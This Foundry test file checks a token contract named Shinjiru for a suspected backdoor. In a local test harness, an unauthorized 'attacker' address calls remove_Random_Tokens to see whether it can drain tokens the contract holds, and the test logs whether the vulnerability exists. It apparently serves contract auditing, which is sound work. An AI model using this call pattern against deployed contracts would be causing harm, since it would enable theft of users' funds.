// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Shinjiru.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    string public name = "MockToken";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    constructor(uint256 initialSupply) {
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ShinjiruBackdoorTest is Test {
    Shinjiru public shinjiru;
    MockToken public mockToken;
    address attacker = makeAddr("attacker");
    uint256 initialSupply = 1000 ether;

    function setUp() public {
        // Mock router address and calls
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address factory = address(0x123);
        address pair = address(0x456);
        address WETH = address(0x789);

        vm.mockCall(
            router,
            abi.encodeWithSignature("factory()"),
            abi.encode(factory)
        );
        vm.mockCall(
            router,
            abi.encodeWithSignature("WETH()"),
            abi.encode(WETH)
        );
        vm.mockCall(
            factory,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(pair)
        );

        // Deploy contract
        shinjiru = new Shinjiru();
        
        // Deploy and fund mock token
        mockToken = new MockToken(initialSupply);
        mockToken.transfer(address(shinjiru), initialSupply);
    }

    function test_randomTokenRemovalByAttacker() public {
        // Verify initial balance
        assertEq(mockToken.balanceOf(address(shinjiru)), initialSupply, "Initial balance mismatch");
        
        console2.log("--- BEFORE-Trigger Balance ---");
        uint256 balanceBefore = mockToken.balanceOf(address(shinjiru));
        console2.log("Contract token balance before attack: %d", balanceBefore);

        console2.log("--- Trigger remove_Random_Tokens ---");
        console2.log("Attacker calling remove_Random_Tokens...");
        vm.prank(attacker);
        shinjiru.remove_Random_Tokens(address(mockToken), 100);

        console2.log("--- AFTER-Trigger Balance ---");
        uint256 balanceAfter = mockToken.balanceOf(address(shinjiru));
        console2.log("Contract token balance after attack: %d", balanceAfter);
        
        uint256 diff = balanceBefore - balanceAfter;
        if (diff > 0) {
            console2.log("Vulnerability Exists: %d tokens removed by attacker", diff);
        } else {
            console2.log("Vulnerability not Exist: no tokens removed (balance unchanged)");
        }
    }
}